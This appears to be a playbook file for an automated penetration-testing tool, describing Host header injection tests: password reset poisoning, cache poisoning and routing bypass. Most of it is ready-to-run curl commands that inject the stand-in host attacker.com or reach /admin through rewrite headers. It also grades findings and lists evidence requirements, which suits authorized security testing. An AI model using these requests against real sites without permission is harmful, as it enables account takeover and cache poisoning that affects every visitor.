---
name: attack-host-header
description: "Host header injection — password reset poisoning, cache poisoning, routing bypass, SSRF via Host"
category: "web-application"
version: "1.0"
author: "cyberstrike-official"
tags:
  - host-header
  - web
  - injection
  - attack
tech_stack:
  - web
cwe_ids:
  - CWE-644
chains_with:
  - attack-cache-poison
  - attack-open-redirect
prerequisites: []
severity_boost:
  attack-cache-poison: "Host header + cache poisoning = stored attack affecting all users"
---

# Host Header Injection

## Objective

Exploit web server reliance on the Host header to poison password reset links, web caches, or route requests to internal services.

## Testing Methodology

### Phase 1: Password Reset Poisoning

```bash
# Trigger password reset with injected Host
curl -X POST https://TARGET/forgot-password \
  -H "Host: attacker.com" \
  -d "email=victim@example.com"

# X-Forwarded-Host variant
curl -X POST https://TARGET/forgot-password \
  -H "X-Forwarded-Host: attacker.com" \
  -d "email=victim@example.com"
```

If the reset email link contains `attacker.com`, the token is leaked when victim clicks.

### Phase 2: Duplicate Host Headers

```bash
# Two Host headers
curl https://TARGET/ \
  -H "Host: TARGET" \
  -H "Host: attacker.com"

# Host with port injection
curl https://TARGET/ \
  -H "Host: TARGET:@attacker.com"
```

### Phase 3: X-Forwarded-Host / X-Host

```bash
curl https://TARGET/ -H "X-Forwarded-Host: attacker.com"
curl https://TARGET/ -H "X-Host: attacker.com"
curl https://TARGET/ -H "X-Forwarded-Server: attacker.com"
curl https://TARGET/ -H "X-Original-URL: /admin"
curl https://TARGET/ -H "X-Rewrite-URL: /admin"
```

### Phase 4: Absolute URL Routing

```bash
# Absolute URL overrides Host header
curl "https://TARGET/api" \
  -H "Host: internal-admin.TARGET"
```

### Phase 5: Web Cache Poisoning via Host

```bash
# If response is cached with injected host
curl https://TARGET/ -H "X-Forwarded-Host: attacker.com" -H "X-Cache: miss"
# Subsequent requests from any user will get poisoned response
```

## What Constitutes a Finding

| Finding | Severity |
|---------|----------|
| Password reset link contains injected host | Critical (P1) |
| Cache poisoned with injected host/links | High (P2) |
| Internal routing bypass (access /admin) | High (P2) |
| Host header reflected in page without sanitization | Medium (P3) |

## Evidence Requirements

- Request with injected Host header
- Response/email showing injected domain
- For cache poisoning: cached response serving injected content
- For password reset: full reset URL with attacker domain

## References

- [PortSwigger: Host Header Attacks](https://portswigger.net/web-security/host-header)
- [OWASP: Host Header Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection)
